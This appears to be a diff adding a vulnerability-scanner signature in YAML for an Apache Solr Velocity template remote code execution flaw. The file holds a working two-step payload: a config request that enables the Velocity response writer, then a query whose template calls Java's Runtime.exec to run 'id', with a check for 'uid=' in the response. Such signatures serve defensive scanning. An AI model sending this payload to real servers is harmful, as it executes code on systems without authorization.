@@ -1,0 +1,39 @@
+# info to search signature
+id: cve-01-04
+info:
+  name: solr-rce
+
+requests:
+  - method: POST
+    redirect: true
+    path: >-
+     {{.BaseURL}}/solr/test/config
+    headers:
+      - Content-Type: application/json
+    body: >-
+      {
+        "update-queryresponsewriter": {
+          "startup": "lazy",
+          "name": "velocity",
+          "class": "solr.VelocityResponseWriter",
+          "template.base.dir": "",
+          "solr.resource.loader.enabled": "true",
+          "params.resource.loader.enabled": "true"
+        }
+      }
+  - method: GET
+    path: >-
+     {{.BaseURL}}/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
+    headers:
+      - Content-Type: application/json
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", "uid=")
+
+
+
+# [optional] just reference info 
+reference:
+  author: whatever
+  links:
+    - https://example.com
